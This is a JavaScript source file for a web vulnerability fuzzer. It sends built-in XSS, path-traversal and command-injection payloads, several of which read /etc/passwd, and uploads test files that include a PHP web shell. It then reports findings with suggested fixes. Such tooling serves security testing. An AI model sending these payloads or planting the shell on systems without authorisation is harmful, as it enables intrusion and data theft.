import axios from 'axios';
import { URL } from 'url';

const FUZZING_PAYLOADS = {
  xss: [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '\'><img src=x onerror=alert(1)>',
    '${alert(1)}',
    '{{constructor.constructor(\'alert(1)\')()}}'
  ],
  traversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\win.ini',
    '%2e%2e%2f%2e%2e%2f',
    '....//....//....//etc/passwd',
    '..%252f..%252f..%252fetc/passwd'
  ],
  injection: [
    '|| 1=1',
    '&& 1=1',
    '; ls -la',
    '| cat /etc/passwd',
    '`cat /etc/passwd`',
    '$(cat /etc/passwd)'
  ]
};

export class Fuzzer {
  constructor(options = {}) {
    this.client = axios.create({
      validateStatus: () => true,
      timeout: options.timeout || 5000
    });
  }

  async fuzzParameter(url, param, value) {
    const issues = [];
    const urlObj = new URL(url);
    const params = new URLSearchParams(urlObj.search);

    for (const [category, payloads] of Object.entries(FUZZING_PAYLOADS)) {
      for (const payload of payloads) {
        try {
          params.set(param, payload);
          const testUrl = `${urlObj.origin}${urlObj.pathname}?${params}`;
          const response = await this.client.get(testUrl);

          // Check for successful injection
          if (this.detectVulnerability(response, category, payload)) {
            issues.push({
              type: 'Input Fuzzing',
              category,
              parameter: param,
              payload,
              issue: `Potential ${category} vulnerability found in parameter: ${param}`,
              fix: this.getSuggestedFix(category)
            });
          }
        } catch (error) {
          // Check if error response indicates vulnerability
          if (this.isVulnerableError(error, category)) {
            issues.push({
              type: 'Input Fuzzing',
              category,
              parameter: param,
              payload,
              issue: `Error-based ${category} vulnerability in parameter: ${param}`,
              fix: this.getSuggestedFix(category)
            });
          }
        }
      }
    }

    return issues;
  }

  async testFileUpload(url, options = {}) {
    const issues = [];
    const maliciousFiles = [
      { name: 'test.php', content: '<?php echo "hack"; ?>', type: 'application/x-php' },
      { name: 'test.jpg.php', content: '<?php system($_GET["cmd"]); ?>', type: 'image/jpeg' },
      { name: '../../../test.txt', content: 'path traversal test', type: 'text/plain' }
    ];

    for (const file of maliciousFiles) {
      const formData = new FormData();
      const blob = new Blob([file.content], { type: file.type });
      formData.append('file', blob, file.name);

      try {
        const response = await this.client.post(url, formData, {
          headers: { 'Content-Type': 'multipart/form-data' }
        });

        if (response.status === 200 || response.status === 201) {
          issues.push({
            type: 'File Upload',
            issue: `Potentially unsafe file upload accepted: ${file.name}`,
            fix: 'Implement strict file type validation and sanitize file names'
          });
        }
      } catch (error) {
        // Expected error for secure implementations
      }
    }

    return issues;
  }

  private detectVulnerability(response, category, payload) {
    const { status, data, headers } = response;

    switch (category) {
      case 'xss':
        return data.includes(payload) && !data.includes('&lt;');
      case 'traversal':
        return (
          data.includes('root:') || 
          data.includes('[boot loader]') ||
          status === 200
        );
      case 'injection':
        return (
          data.includes('uid=') ||
          data.includes('root:') ||
          data.includes('WIN.INI')
        );
      default:
        return false;
    }
  }

  private isVulnerableError(error, category) {
    const errorData = error.response?.data || '';
    const errorMessage = error.message || '';

    switch (category) {
      case 'xss':
        return errorData.includes('parsing error');
      case 'traversal':
        return errorMessage.includes('ENOENT') || errorMessage.includes('access denied');
      case 'injection':
        return errorData.includes('syntax error') || errorData.includes('command not found');
      default:
        return false;
    }
  }

  private getSuggestedFix(category) {
    const fixes = {
      xss: 'Implement proper output encoding and Content Security Policy (CSP)',
      traversal: 'Sanitize file paths and implement proper access controls',
      injection: 'Use parameterized queries and input validation'
    };
    return fixes[category] || 'Implement proper input validation and sanitization';
  }
}